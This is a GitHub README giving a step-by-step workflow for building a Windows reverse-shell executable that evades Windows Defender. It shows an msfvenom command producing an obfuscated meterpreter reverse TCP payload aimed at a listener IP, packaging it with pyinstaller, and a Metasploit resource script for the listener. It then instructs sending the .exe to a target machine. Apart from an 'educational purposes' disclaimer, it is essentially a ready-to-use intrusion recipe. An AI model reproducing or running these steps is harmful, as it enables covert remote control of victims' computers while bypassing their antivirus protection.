# Windows-AV-Evasion
The easiest way to achieve a reverse shell bypassing Windows Defender 

<img width="324" height="324" alt="image" src="https://github.com/user-attachments/assets/18267b34-b490-4dec-b64b-f39866f96b88" />


> [!WARNING]  
> The entire repo and the information shown is only for educational and informational porpuses.

## Workflow
First, with `msfvenom` we make the payload as a `.py` file and using `python-reflection` in order to make the exploit already obfuscated. 

```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.20 lport=443 -f python-reflection -o reload.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of python-reflection file: 1337649 bytes
Saved as: reload.py

```

Then we need to add the `ctypes` since it's needed by `python-reflection`
```shell
nano reload.py 
```
<img width="1086" height="119" alt="image" src="https://github.com/user-attachments/assets/52339303-b351-460f-ba66-131586371201" />


Now in order to generate a .exe file we can use pyinstaller from Windows or we can use pyinstaller within`wine` if we had it previously installer. 
 
```shell
wine pyinstaller -F hoax_shell.py --onefile
```

Or directly in Windows: 
```powershell
pyinstaller -F hoax_shell.py --onefile
```

Once we have the .exe file, we run a meterpreter session either manually or with the next `.rc` file:

```shell
nano test.rc
```

```shell
use payload windows/x64/meterpreter_reverse_tcp
set lhost 192.168.1.20
set lport 443 
exploit
```

```bash
msfconsole -r test.rc
```

Then we just send the `.exe` to the target machine and we can execute it either by using GUI (RDP) or using remote command execution.

![](img/rev_shell_AV_evasion.gif)


The script embed will start a meterpreter shell using meterpreter waiting for connections 

```shell
$ ./listiner.sh


[!] Missing parameters.


[USE] ./test.sh <LHOST> <LPORT>

Parameters:
  <LHOST>   LOCAL IP
  <LPORT>   LOCAL PORT

Example: ./test.sh 192.168.1.20 443

```
